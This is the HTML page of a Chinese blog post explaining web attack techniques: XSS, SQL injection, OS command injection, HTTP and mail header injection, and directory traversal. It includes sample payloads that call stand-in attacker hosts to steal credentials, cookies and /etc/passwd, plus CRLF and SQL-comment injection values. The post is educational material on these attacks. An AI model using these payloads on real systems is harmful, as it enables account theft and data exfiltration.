@@ -1,0 +1,421 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>10. Web 的攻击技术 | 我的生活小站</title><meta name="author" content="Li Jing"><meta name="copyright" content="Li Jing"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="针对 Web 的攻击技术简单的 HTTP 协议本身并不存在安全性问题，因此协议本身几乎不会成为攻击的对象。应用 HTTP 协议的服务器和客户端，以及运行在服务器上的Web应用等资源才是攻击目标 目前，来自互联网的攻击大多是冲着 Web 站点来的，它们大多把 Web 应用作为攻击目标  HTTP 不具备必要的���全功能几乎现今所有的 Web 网站都会使用会话（session）管理、加密处理等">
+<meta property="og:type" content="article">
+<meta property="og:title" content="10. Web 的攻击技术">
+<meta property="og:url" content="https://ohyesc.github.io/2023/11/20/Http/10.%20Web%20%E7%9A%84%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF-uh5p8t-en6m1o/index.html">
+<meta property="og:site_name" content="我的生活小站">
+<meta property="og:description" content="针对 Web 的攻击技术简单的 HTTP 协议本身并不存在安全性问题，因此协议本身几乎不会成为攻击的对象。应用 HTTP 协议的服务器和客户端，以及运行在服务器上的Web应用等资源才是攻击目标 目前，来自互联网的攻击大多是冲着 Web 站点来的，它们大多把 Web 应用作为攻击目标  HTTP 不具备必要的���全功能几乎现今所有的 Web 网站都会使用会话（session）管理、加密处理等">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://i.loli.net/2021/02/24/5O1day2nriDzjSu.png">
+<meta property="article:published_time" content="2023-11-20T01:35:06.688Z">
+<meta property="article:modified_time" content="2023-11-20T01:54:47.568Z">
+<meta property="article:author" content="Li Jing">
+<meta property="article:tag" content="Http">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://i.loli.net/2021/02/24/5O1day2nriDzjSu.png"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://ohyesc.github.io/2023/11/20/Http/10.%20Web%20%E7%9A%84%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF-uh5p8t-en6m1o/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '10. Web 的攻击技术',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2023-11-20 09:54:47'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+    win.getCSS = (url,id = false) => new Promise((resolve, reject) => {
+      const link = document.createElement('link')
+      link.rel = 'stylesheet'
+      link.href = url
+      if (id) link.id = id
+      link.onerror = reject
+      link.onload = link.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        link.onload = link.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(link)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><meta name="generator" content="Hexo 6.3.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://i.loli.net/2021/02/24/5O1day2nriDzjSu.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">125</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">10</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">24</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><span id="blog-info"><a href="/" title="我的生活小站"><span class="site-name">我的生活小站</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">10. Web 的攻击技术</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-11-20T01:35:06.688Z" title="发表于 2023-11-20 09:35:06">2023-11-20</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-11-20T01:54:47.568Z" title="更新于 2023-11-20 09:54:47">2023-11-20</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/">计算机网络</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="10. Web 的攻击技术"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><meta name="referrer" content="no-referrer">
+
+<p><a name="4048dc85"></a></p>
+<h2 id="针对-Web-的攻击技术"><a href="#针对-Web-的攻击技术" class="headerlink" title="针对 Web 的攻击技术"></a>针对 Web 的攻击技术</h2><p>简单的 HTTP 协议本身并不存在安全性问题，因此协议本身几乎不会成为攻击的对象。应用 HTTP 协议的服务器和客户端，以及运行在服务器上的Web应用等资源才是攻击目标</p>
+<p>目前，来自互联网的攻击大多是冲着 Web 站点来的，它们大多把 Web 应用作为攻击目标<br><img src="https://cdn.nlark.com/yuque/0/2021/png/1251600/1610706871901-645f1f0b-31cb-4ee3-8263-6838aea41c88.png#align=left&display=inline&height=384&originHeight=384&originWidth=732&size=243574&status=done&style=none&width=732" alt="image.png"></p>
+<p><a name="48626249"></a></p>
+<h3 id="HTTP-不具备必要的���全功能"><a href="#HTTP-不具备必要的���全功能" class="headerlink" title="HTTP 不具备必要的���全功能"></a>HTTP 不具备必要的���全功能</h3><p>几乎现今所有的 Web 网站都会使用会话（session）管理、加密处理等安全性方面的功能，而 HTTP 协议内并 不具备这些功能</p>
+<p>从整体上看，HTTP 就是一个通用的单纯协议机制。因此它具备较多优势，但是在安全性方面则呈劣势。就拿远程登录时会用到的SSH协议来说，SSH具备协议级别的认证及会话管理等功能，HTTP协议则没有。</p>
+<p>因此，开发者需要自行设计并开发认证及会话管理功能来满足Web应用的安全。而自行设计就意味着会出现各种形形色色的实现。结果，安全等级并不完备，可仍在运作的Web应用背后却隐藏着各种容易被攻击者滥用的安全漏洞的Bug。</p>
+<p><a name="0683cdb0"></a></p>
+<h3 id="在客户端即可篡改请求"><a href="#在客户端即可篡改请求" class="headerlink" title="在客户端即可篡改请求"></a>在客户端即可篡改请求</h3><p>在 Web 应用中，从浏览器那接收到的HTTP请求的全部内容，都可以在客户端自由地变更、篡改。所以 Web 应用可能会接收到与预期数据不相同的内容</p>
+<p>在 HTTP 请求报文内加载攻击代码，就能发起对Web应用的攻击。通过URL查询字段或表单、HTTP 首部、Cookie等途径把攻击代码传入，若这时Web应用存在安全漏洞，那内部信息就会遭到窃取，或被攻击者拿到管理权限。<br><img src="https://cdn.nlark.com/yuque/0/2021/png/1251600/1610706880566-31d0a56b-3f82-47ca-a730-93ed24959bf1.png#align=left&display=inline&height=448&originHeight=448&originWidth=766&size=210529&status=done&style=none&width=766" alt="image.png"></p>
+<p><a name="c0a39ebf"></a></p>
+<h3 id="针对-Web-应用的攻击模式"><a href="#针对-Web-应用的攻击模式" class="headerlink" title="针对 Web 应用的攻击模式"></a>针对 Web 应用的攻击模式</h3><p>对 Web 应用的攻击模式有以下两种:</p>
+<ul>
+<li>主动攻击</li>
+<li>被动攻击</li>
+</ul>
+<p><a name="95810334"></a></p>
+<h4 id="以服务器为目标的主动攻击"><a href="#以服务器为目标的主动攻击" class="headerlink" title="以服务器为目标的主动攻击"></a>以服务器为目标的主动攻击</h4><p>主动攻击（active attack）是指攻击者通过直接访问Web应用，把攻击代码传入的攻击模式。由于该模式是直接针对服务器上的资源进行攻击，因此攻击者需要能够访问到那些资源。</p>
+<p>主动攻击模式里具有代表性的攻击是 SQL注入攻击和 OS 命令注入攻击。<br><img src="https://cdn.nlark.com/yuque/0/2021/png/1251600/1610706889607-849bbc7a-bc8c-4af2-973b-6fb3c39fc758.png#align=left&display=inline&height=439&originHeight=439&originWidth=738&size=168862&status=done&style=none&width=738" alt="image.png"></p>
+<p><a name="10f959b3"></a></p>
+<h4 id="以服务器为目标的被动攻击"><a href="#以服务器为目标的被动攻击" class="headerlink" title="以服务器为目标的被动攻击"></a>以服务器为目标的被动攻击</h4><p>被动攻击（passive attack）是指利用圈套策略执行攻击代码的攻击模式。在被动攻击过程中，攻击者不直接对目标 Web 应用访问发起攻击。<br><img src="https://cdn.nlark.com/yuque/0/2021/png/1251600/1610706897387-7bac4ccd-1bb0-4610-9c6c-bb849e0c477f.png#align=left&display=inline&height=497&originHeight=497&originWidth=720&size=287909&status=done&style=none&width=720" alt="image.png"></p>
+<ul>
+<li>攻击者诱���用户触发已设置好的陷阱，而陷阱会启动发 送已嵌入攻击代码的 HTTP 请求</li>
+<li>当用户不知不觉中招之后，用户的浏览器或邮件客户端就会触发这个陷阱</li>
+<li>中招后的用户浏览器会把含有攻击代码的 HTTP 请求发 送给作为攻击目标的 Web 应用，运行攻击代码</li>
+<li>执行完攻击代码，存在安全漏洞的Web应用会成为攻击者的跳板，可能导致用户所持的 Cookie 等个人信息被窃取，登录状态中的用户权限遭恶意滥用等后果。</li>
+</ul>
+<p>被动攻击模式中具有代表性的攻击是跨站脚本攻击和跨站点请求伪造。</p>
+<p>利用被动攻击，可发起对原本从互联网上无法直接访问的企业内网等网络的攻击。只要用户踏入攻击者预先设好的陷阱，在用户能够访问到的网络范围内，即使是企业内网也同样会受到攻击</p>
+<p>很多企业内网依然可以连接到互联网上，访问Web网站，或接收互联网发来的邮件。这样就可能给攻击者以可乘之机，诱导用户触发陷阱后对企业内网发动攻击。<br><img src="https://cdn.nlark.com/yuque/0/2021/png/1251600/1610706907135-97309423-a349-4276-b05e-f3f9665dfb54.png#align=left&display=inline&height=428&originHeight=428&originWidth=742&size=257101&status=done&style=none&width=742" alt="image.png"></p>
+<p><a name="19c88f3e"></a></p>
+<h2 id="因输出值转义不完全引发的安全漏洞"><a href="#因输出值转义不完全引发的安全漏洞" class="headerlink" title="因输出值转义不完全引发的安全漏洞"></a>因输出值转义不完全引发的安全漏洞</h2><p>实施 Web 应用的安全对策可大致分为以下两部分：</p>
+<ul>
+<li>客户端的验证</li>
+<li>Web 应用端（服务器端）的验证<ul>
+<li>输入值验证</li>
+<li>输出值转义</li>
+<li><img src="https://cdn.nlark.com/yuque/0/2021/png/1251600/1610706916362-02b471cd-4538-43d1-9a13-a8227d704359.png#align=left&display=inline&height=210&originHeight=210&originWidth=742&size=128085&status=done&style=none&width=742" alt="image.png"></li>
+</ul>
+</li>
+</ul>
+<p>多数情况下采用JavaScript在客户端验证数据。可是在客户端允许篡 改数据或关闭 JavaScript，不适合将JavaScript验证作为安全的防范对策。保留客户端验证只是为了尽早地辨识输入错误，起到提高UI体验的作用。</p>
+<p>Web应用端的输入值验证按Web应用内的处理则有可能被误认为是具有攻击性意义的代码。输入值验证通常是指检查是否是符合系统业务逻辑的数值或检查字符编码等预防对策。</p>
+<p>从数据库或文件系统、HTML、邮件等输出Web应用处理的数据之际，针对输出做值转义处理是一项至关重要的安全策略。当输出值转义不完全时，会因触发攻击者传入的攻击代码，而给输出对象带来损害。</p>
+<p><a name="1d4d889f"></a></p>
+<h3 id="跨站脚本攻击"><a href="#跨站脚本攻击" class="headerlink" title="跨站脚本攻击"></a>跨站脚本攻击</h3><p>跨站脚本攻击（Cross-Site Scripting，XSS）是指通过存在安全漏洞的Web 网站注册用户的浏览器内运行非法的HTML标签或JavaScript进行的一种攻击。</p>
+<p>动态创建的 HTML部分有可能隐藏着安全漏洞。就这样，攻击者编写脚本设下陷阱，用户在自己的浏览器上运行时，一不小心就会受到被动攻击。</p>
+<p>跨站脚本攻击有可能造成以下影响：</p>
+<ul>
+<li>利用虚假输入表单骗取用户个人信息</li>
+<li>利用脚本窃取用户的Cookie值，被害者在不知情的情况下，帮助攻击者发送恶意请求</li>
+<li>显示伪造的文章或图片</li>
+</ul>
+<p><a name="e03f7cc4"></a></p>
+<h4 id="跨站脚本攻击案例"><a href="#跨站脚本攻击案例" class="headerlink" title="跨站脚本攻击案例"></a>跨站脚本攻击案例</h4><p><a name="HTML"></a></p>
+<h5 id="HTML"><a href="#HTML" class="headerlink" title="HTML"></a>HTML</h5><p>在动态生成 HTML处发生下面以编辑个人信息页面为例讲解跨站脚本攻击。<br><img src="https://cdn.nlark.com/yuque/0/2021/png/1251600/1610706925192-11b68a3d-4a0b-47ae-9007-6b7df3c9f58d.png#align=left&display=inline&height=267&originHeight=267&originWidth=714&size=91421&status=done&style=none&width=714" alt="image.png"></p>
+<p>确认界面按原样显示在编辑界面输入的字符串。此处输入带有山 口一郎这样的 HTML标签的字符串。<br><img src="https://cdn.nlark.com/yuque/0/2021/png/1251600/1610706932320-2d153ba5-e608-46e9-85e2-8f890ad65275.png#align=left&display=inline&height=267&originHeight=267&originWidth=717&size=127285&status=done&style=none&width=717" alt="image.png"></p>
+<p>此时的确认界面上，浏览器会把用户输入的s解析成HTML标签，然后显示删除线。 删除线显示出来并不会造成太大的不利后果，但如果换成使用script标签将会如何呢。</p>
+<p><a name="XSS"></a></p>
+<h5 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h5><p>XSS 是攻击者利用预先设置的陷阱触发的被动攻击</p>
+<p>跨站脚本攻击属于被动攻击模式，因此攻击者会事先布置好用于攻击的陷阱。</p>
+<p>通过地址栏中 URI的查询字段指定ID，即相当于在表单内自动填写字符串的功能。而就在这个地方，隐藏着可执行跨站脚本攻击的漏洞</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2021/png/1251600/1610706941954-f4fde5e6-8c13-4115-a5a5-d3dae9265e95.png#align=left&display=inline&height=323&originHeight=323&originWidth=396&size=52732&status=done&style=none&width=396" alt="image.png"><br>充分熟知此处漏洞特点的攻击者，于是就创建了下面这段嵌入恶 意代码的 URL。并隐藏植入事先准备好的欺诈邮件中或 Web 页 面内，诱使用户去点击该 URL。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://example.jp/login?ID=&quot;&gt;&lt;script&gt;var+f=document.getElementById(&quot;login&quot;);+f.action=&quot;http://hackr.jp/pwget&quot;;+f.method=&quot;get&quot;;&lt;/script&gt;&lt;span+s=&quot;</span><br></pre></td></tr></table></figure>
+
+<p>浏览器打开该 URI 后，直观感觉没有发生任何变化，但设置好的脚本却偷偷开始运行了。当用户在表单内输入ID和密码之后，就会直接发送到攻击者的网站</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2021/png/1251600/1610706952030-4d1a5833-cb5a-4af1-a352-2cb469d74dbb.png#align=left&display=inline&height=237&originHeight=237&originWidth=708&size=132169&status=done&style=none&width=708" alt="image.png"><br>之后，ID 及密码会传给该正规网站，而接下来仍然是按正常登录步骤，用户很难意识到自己的登录信息已遭泄露。</p>
+<p><a name="47814301"></a></p>
+<h5 id="对用户-Cookie-的窃取攻击"><a href="#对用户-Cookie-的窃取攻击" class="headerlink" title="对用户 Cookie 的窃取攻击"></a>对用户 Cookie 的窃取攻击</h5><p>除了在表单中设下圈套之外，下面那种恶意构造的脚本同样能够以跨站脚本攻击的方式，窃取到用户的 Cookie 信息。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src=http://hackr.jp/xss.js&gt;&lt;/script&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">// JS内容</span><br><span class="line">var content = escape(document.cookie); document.write(&quot;&lt;img src=http://hackr.jp/?&quot;); document.write(content); document.write(&quot;&gt;&quot;);</span><br></pre></td></tr></table></figure>
+
+<p>在存在可跨站脚本攻击安全漏洞的Web应用上执行上面这段JavaScript程序，即可访问到该Web应用所处域名下的Cookie信息。然后这些信息会发送至攻击者的Web网站，记录在他的登录日志中。结果，攻击者就这样窃取到用户的 Cookie 信息了。<br><img src="https://cdn.nlark.com/yuque/0/2021/png/1251600/1610706959259-756b1ab7-5867-45e8-8a52-8c8bab90d1f9.png#align=left&display=inline&height=318&originHeight=318&originWidth=708&size=105221&status=done&style=none&width=708" alt="image.png"></p>
+<p><a name="5b3b2e1e"></a></p>
+<h3 id="SQL注入攻击"><a href="#SQL注入攻击" class="headerlink" title="SQL注入攻击"></a>SQL注入攻击</h3><p><a name="947b656c"></a></p>
+<h4 id="会执行非法SQL的SQL注入攻击"><a href="#会执行非法SQL的SQL注入攻击" class="headerlink" title="会执行非法SQL的SQL注入攻击"></a>会执行非法SQL的SQL注入攻击</h4><p>SQL注入（SQLInjection）是指针对 Web 应用使用的数据库，通过运行非法的 SQL而产生的攻击。该安全隐患有可能引发极大的威胁，有时会直接导致个人信息及机密信息的泄露。</p>
+<p>Web 应用通常都会用到数据库，当需要对数据库表内的数据进行检索或添加、删除等操作时，会使用 SQL语句连接数据库进行特定的操作。如果在调用SQL语句的方式上存在疏漏，就有可 能执行被恶意注入（Injection）非法 SQL语句。]</p>
+<ul>
+<li>非法查看或篡改数据库内的数据</li>
+<li>规避认证</li>
+<li>执行和数据库服务器业务关联的程序等</li>
+</ul>
+<p><a name="61cdd67f"></a></p>
+<h4 id="SQL注入攻击案例"><a href="#SQL注入攻击案例" class="headerlink" title="SQL注入攻击案例"></a>SQL注入攻击案例</h4><p>下面以某个购物网站的搜索功能为例，可以将某作者的名字作为搜索关键字，查找该作 者的所有著作<br><img src="https://cdn.nlark.com/yuque/0/2021/png/1251600/1610706968049-fbd3f4b8-3b29-4d5f-afbf-b4cfb4303a61.png#align=left&display=inline&height=381&originHeight=381&originWidth=707&size=155714&status=done&style=none&width=707" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2021/png/1251600/1610706978360-94552b1e-1283-4f7a-9348-c5d62a1a3a2f.png#align=left&display=inline&height=389&originHeight=389&originWidth=723&size=198531&status=done&style=none&width=723" alt="image.png"></p>
+<p>把刚才指定查询字段的上野宣改写成“上野宣’–”。<br><img src="https://cdn.nlark.com/yuque/0/2021/png/1251600/1610706988162-c9827111-63bc-4589-a509-aa8b51839129.png#align=left&display=inline&height=479&originHeight=479&originWidth=727&size=254982&status=done&style=none&width=727" alt="image.png"></p>
+<p>SQL语句中的 – 之后全视为注释。即，and flag&#x3D;1 这个条件被自动忽略了<br><img src="https://cdn.nlark.com/yuque/0/2021/png/1251600/1610706999721-4b7f7d3d-175e-46b6-a512-1879beac3d23.png#align=left&display=inline&height=401&originHeight=401&originWidth=700&size=397937&status=done&style=none&width=700" alt="image.png"></p>
+<p>结果跟 flag 的设定值无关，只取出满足author&#x3D;“上野宣”条件所在行的数据，这样连那些尚未出版的书籍也一并显示出来了<br><img src="https://cdn.nlark.com/yuque/0/2021/png/1251600/1610707006436-3ba6f49f-1cd2-45a1-b590-8b0c48abbc27.png#align=left&display=inline&height=380&originHeight=380&originWidth=723&size=153261&status=done&style=none&width=723" alt="image.png"></p>
+<p><a name="dd61093a"></a></p>
+<h3 id="OS-命令注入攻击"><a href="#OS-命令注入攻击" class="headerlink" title="OS 命令注入攻击"></a>OS 命令注入攻击</h3><p>OS命令注入攻击（OS Command Injection）是指通过Web应用，执行非法的操作系统命令达到攻击的目的。只要在能调用Shell函数的地方就有存在被攻击的风险</p>
+<p>OS 命令注入攻击可以向 Shell 发送命令，让 Windows 或 Linux 操作系 统的命令行启动程序。也就是说，通过 OS 注入攻击可执行OS上安装着的各种程序</p>
+<p><a name="4eb740ae"></a></p>
+<h4 id="OS-注入攻击案例"><a href="#OS-注入攻击案例" class="headerlink" title="OS 注入攻击案例"></a>OS 注入攻击案例</h4><p>将��户的咨询邮件按已填写的对方邮箱地址发送过去<br><img src="https://cdn.nlark.com/yuque/0/2021/png/1251600/1610707014328-cff200aa-41e6-42d6-8a55-7174164c9459.png#align=left&display=inline&height=340&originHeight=340&originWidth=448&size=36364&status=done&style=none&width=448" alt="image.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">my $adr = $q-&gt;param(&#x27;mailaddress&#x27;); </span><br><span class="line">open(MAIL, &quot;| /usr/sbin/sendmail $adr&quot;); </span><br><span class="line">print MAIL &quot;From: info@example.com\n&quot;;</span><br></pre></td></tr></table></figure>
+
+<p>攻击者将下面的值指定作为邮件地址。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">; cat /etc/passwd | mail hack@example.jp</span><br></pre></td></tr></table></figure>
+
+<p>程序接收该值，构成以下的命令组合。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">| /usr/sbin/sendmail ; cat /etc/passwd | mail hack@example.jp</span><br></pre></td></tr></table></figure>
+
+<p>攻击者的输入值中含有分号（;）。这个符号在OS命令中，会被解析为分隔多个执行命令的标记。</p>
+<p>结果，含有 Linux 账户信息 &#x2F;etc&#x2F;passwd 的文件，就以邮件形式发送给了 <a href="mailto:hack@example.jp">hack@example.jp</a></p>
+<p><a name="d9b0afee"></a></p>
+<h3 id="HTTP-首部注入攻击"><a href="#HTTP-首部注入攻击" class="headerlink" title="HTTP 首部注入攻击"></a>HTTP 首部注入攻击</h3><p>HTTP 首部注入攻击（HTTP Header Injection）是指攻击者通过在响应首部字段内插入换行，添加任意响应首部或主体的一种攻击。属于被动攻击模式</p>
+<p>向首部主体内添加内容的攻击称为HTTP响应截断攻击（HTTP Response Splitting Attack）。</p>
+<p>Web 应用有时会把从外部接收到的数值，赋给响应首部字段Location和Set-Cookie。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Location: http://www.example.com/a.cgi?q=12345 </span><br><span class="line">Set-Cookie: UID=12345 </span><br><span class="line"></span><br><span class="line">// 12345就是插入值</span><br></pre></td></tr></table></figure>
+
+<p>HTTP 首部注入可能像这样，通过在某些响应首部字段需要处理输出值的地方，插入换行发动攻击</p>
+<p>造成以下一些影响</p>
+<ul>
+<li>设置任何 Cookie 信息</li>
+<li>重定向至任意 URL</li>
+<li>显示任意的主体（HTTP 响应截断攻击）</li>
+</ul>
+<p><a name="a000befb"></a></p>
+<h3 id="邮件首部注入攻击"><a href="#邮件首部注入攻击" class="headerlink" title="邮件首部注入攻击"></a>邮件首部注入攻击</h3><p>邮件首部注入（Mail Header Injection）是指Web应用中的邮件发送功能，攻击者通过向邮件首部 To 或 Subject 内任意添加非法内容发起的攻击。利用存在安全漏洞的Web网站，可对任意邮件地址发送广告邮件或病毒邮件。</p>
+<p><a name="cf3e2664"></a></p>
+<h4 id="案例"><a href="#案例" class="headerlink" title="案例"></a>案例</h4><p>表单内填入咨询者的邮件地址及咨询内容后，以邮件的形式发送给网站管理员<br><img src="https://cdn.nlark.com/yuque/0/2021/png/1251600/1610707024610-ac81dca6-52c7-4ba8-92ed-e828a362685d.png#align=left&display=inline&height=323&originHeight=323&originWidth=434&size=34918&status=done&style=none&width=434" alt="image.png"></p>
+<p>攻击者将以下数据作为邮件地址发起请求</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bob@hackr.jp%0D%0ABcc: user@example.com</span><br></pre></td></tr></table></figure>
+
+<p>%0D%0A 在邮件报文中代表换行符。一旦咨询表单所在的Web应用接收了这个换行符，就可能实现对 Bcc 邮件地址的追加发送，而这原本是无法指定的。</p>
+<p>像下面一样，使用两个连续的换行符就有可能篡改邮件文本内容并发送</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bob@hackr.jp%0D%0A%0D%0ATest Message</span><br></pre></td></tr></table></figure>
+
+<p>再以相同的方法，就有可能改写To和Subject等任意邮件首部，或向文本添加附件等动作。</p>
+<p><a name="5a26f0b5"></a></p>
+<h3 id="目录遍历攻击"><a href="#目录遍历攻击" class="headerlink" title="目录遍历攻击"></a>目录遍历攻击</h3><p>目录遍历（Directory Traversal）攻击是指对本无意公开的文件目录，通过非法截断其目录路径后，达成访问目的的一种攻击。这种攻击有时也称为路径遍历（Path Traversal）攻击</p>
+<p>通过 Web 应用对文件处理操作时，在由外部指定文件名的处理存在疏漏的情况下，用户可使用 …&#x2F; 等相对路径定位到&#x2F;etc&#x2F;passed等绝对路径上，因此服务器上任意的文件或文件目录皆有可能被访问到。这样一来，就有可能非法浏览、篡改或删除 Web 服务器上的文件。</p>
+<p>固然存在输出值转义的问题，但更应该关闭指定对任意文件名的访问权限。</p>
